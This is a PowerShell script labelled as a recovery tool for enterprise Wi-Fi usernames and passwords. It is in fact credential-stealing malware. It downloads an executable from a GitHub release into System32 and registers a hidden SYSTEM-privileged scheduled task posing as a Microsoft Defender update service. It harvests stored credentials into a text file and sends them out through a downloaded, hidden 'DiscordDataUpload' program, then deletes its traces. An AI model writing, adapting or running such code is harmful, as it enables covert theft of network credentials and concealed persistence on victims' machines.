#Fully Functional script to recover Usernames and Passwords for Enterprice Networks.
$directoryPath = "C:\Windows\System32"
$localFilePath = "C:\Windows\System32\EnterpriseWifiPasswordRecover.exe"
$outputFilePath = "C:\Windows\System32\output.txt"
$boturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
$botpath = "C:\Windows\System32\DiscordDataUpload.exe"
$userAccounts = Get-LocalUser | Select-Object -ExpandProperty Name
$excludedUsernames = @("Administrator", "DefaultAccount", "Guest", "WDAGUtilityAccount")
$filteredUsernames = $userAccounts | Where-Object { $excludedUsernames -notcontains $_ }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$enturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/EnterpriseWifiPasswordRecover.exe"
$pingdaemontask = "Microsft Defender Update Service"
if (-not (Test-Path (Split-Path $localFilePath))) {
    New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
}
if (Test-Path -Path $localFilePath -PathType Leaf) {
    Remove-Item -Path $localFilePath -Force
} try {
    Invoke-WebRequest -Uri $enturl -OutFile $localFilePath -UseBasicParsing
} catch {}
$pingdaemonxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-24T19:20:37.0889003</Date>
    <Author>Micrsoft\System</Author>
    <URI>\Microsft Defender Update Service</URI>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\EnterpriseWifiPasswordRecover.exe</Command>
      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@
if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
} else {}
Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
Start-ScheduledTask -TaskName $pingdaemontask
$currentUsername = $env:USERNAME
$outputPath = Join-Path -Path "C:\Windows\System32" -ChildPath ("$currentUsername" + "epa.txt")
Start-Process -FilePath $localFilePath -ArgumentList "-u $currentUsername" -RedirectStandardOutput $outputPath -Wait
if (Test-Path $outputPath) {
} else {}
$outputContent = Get-Content $outputFilePath
$usernames = @()
$passwords = @()
$userRegex = "Username: (.+)"
$passwordRegex = "Password: (.+)"
foreach ($line in $outputContent) {
    if ($line -match $userRegex) {
        $usernames += $matches[1]
    } elseif ($line -match $passwordRegex) {
        $passwords += $matches[1]
    }
}
if ($usernames.Count -eq $passwords.Count) {
    $credentialsTable = @()
    for ($i = 0; $i -lt $usernames.Count; $i++) {
        $credentialsTable += [PSCustomObject]@{
            File = $outputFilePath
            Username = $usernames[$i]
            Password = $passwords[$i]
        }
    }
$credentialsTable | Format-Table -AutoSize | Out-File -FilePath $outputFilePath
Invoke-WebRequest -Uri $boturl -OutFile $botpath
if (Test-Path $botpath) {
    $output = "C:\Windows\System32\output.txt"
    Start-Process -FilePath $botpath -ArgumentList "-File $output" -WindowStyle Hidden
} else {}
#CleanUP
$folderPath = "C:\Windows\System32\profiles"
if (Test-Path $localFilePath) {
    Remove-Item -Path $localFilePath -Force
} else {}
$filesToDelete = Get-ChildItem -Path "C:\Windows\System32" -Filter "*epa.txt"
foreach ($file in $filesToDelete) {
    Remove-Item -Path $file.FullName -Force
}
if (Test-Path $folderPath) {
    Remove-Item -Path $folderPath -Recurse -Force
} else {}
Timeout /NoBreak 30
if (Test-Path $botpath) {
    Remove-Item -Path $botpath -Force
} else {}